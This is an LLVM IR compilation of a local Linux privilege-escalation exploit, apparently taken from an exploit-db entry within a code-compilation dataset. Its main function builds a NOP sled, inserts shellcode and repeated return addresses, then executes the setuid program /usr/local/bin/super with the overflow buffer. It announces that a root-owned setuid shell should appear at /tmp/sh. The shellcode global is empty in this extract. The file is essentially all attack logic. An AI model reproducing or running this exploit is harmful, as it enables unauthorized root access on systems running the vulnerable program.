; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19270.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19270.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [30 x i8] c"\0Awargames at 0x%x, offset %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"Look for a suid shell root owned at /tmp/sh\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"/usr/local/bin/super\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"super\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-T\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2040 x i8], align 16
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1000, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp sgt i32 %12, 1
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @atoi(i8* %17)
  store i32 %18, i32* %10, align 4
  br label %19

19:                                               ; preds = %14, %2
  %20 = call i32 (...) @getsp()
  %21 = load i32, i32* %10, align 4
  %22 = add nsw i32 %20, %21
  %23 = sext i32 %22 to i64
  store i64 %23, i64* %7, align 8
  store i32 0, i32* %8, align 4
  br label %24

24:                                               ; preds = %34, %19
  %25 = load i32, i32* %8, align 4
  %26 = load i8*, i8** @shellcode, align 8
  %27 = call i32 @strlen(i8* %26)
  %28 = sub nsw i32 1410, %27
  %29 = icmp slt i32 %25, %28
  br i1 %29, label %30, label %37

30:                                               ; preds = %24
  %31 = load i32, i32* %8, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 %32
  store i8 -112, i8* %33, align 1
  br label %34

34:                                               ; preds = %30
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %24

37:                                               ; preds = %24
  br label %38

38:                                               ; preds = %52, %37
  %39 = load i32, i32* %9, align 4
  %40 = load i8*, i8** @shellcode, align 8
  %41 = call i32 @strlen(i8* %40)
  %42 = icmp slt i32 %39, %41
  br i1 %42, label %43, label %57

43:                                               ; preds = %38
  %44 = load i8*, i8** @shellcode, align 8
  %45 = load i32, i32* %9, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = load i32, i32* %8, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 %50
  store i8 %48, i8* %51, align 1
  br label %52

52:                                               ; preds = %43
  %53 = load i32, i32* %8, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %8, align 4
  %55 = load i32, i32* %9, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %9, align 4
  br label %38

57:                                               ; preds = %38
  br label %58

58:                                               ; preds = %92, %57
  %59 = load i32, i32* %8, align 4
  %60 = icmp slt i32 %59, 1500
  br i1 %60, label %61, label %95

61:                                               ; preds = %58
  %62 = load i64, i64* %7, align 8
  %63 = and i64 %62, 4278190080
  %64 = ashr i64 %63, 24
  %65 = trunc i64 %64 to i8
  %66 = load i32, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 %67
  store i8 %65, i8* %68, align 1
  %69 = load i64, i64* %7, align 8
  %70 = and i64 %69, 255
  %71 = trunc i64 %70 to i8
  %72 = load i32, i32* %8, align 4
  %73 = add nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 %74
  store i8 %71, i8* %75, align 1
  %76 = load i64, i64* %7, align 8
  %77 = and i64 %76, 65280
  %78 = ashr i64 %77, 8
  %79 = trunc i64 %78 to i8
  %80 = load i32, i32* %8, align 4
  %81 = add nsw i32 %80, 2
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 %82
  store i8 %79, i8* %83, align 1
  %84 = load i64, i64* %7, align 8
  %85 = and i64 %84, 16711680
  %86 = ashr i64 %85, 16
  %87 = trunc i64 %86 to i8
  %88 = load i32, i32* %8, align 4
  %89 = add nsw i32 %88, 3
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 %90
  store i8 %87, i8* %91, align 1
  br label %92

92:                                               ; preds = %61
  %93 = load i32, i32* %8, align 4
  %94 = add nsw i32 %93, 4
  store i32 %94, i32* %8, align 4
  br label %58

95:                                               ; preds = %58
  %96 = load i32, i32* %8, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %8, align 4
  %98 = sext i32 %96 to i64
  %99 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 %98
  store i8 0, i8* %99, align 1
  %100 = load i64, i64* %7, align 8
  %101 = load i32, i32* %10, align 4
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str, i64 0, i64 0), i64 %100, i32 %101)
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  %104 = getelementptr inbounds [2040 x i8], [2040 x i8]* %6, i64 0, i64 0
  %105 = call i32 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %104, i8* null)
  %106 = load i32, i32* %3, align 4
  ret i32 %106
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @getsp(...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
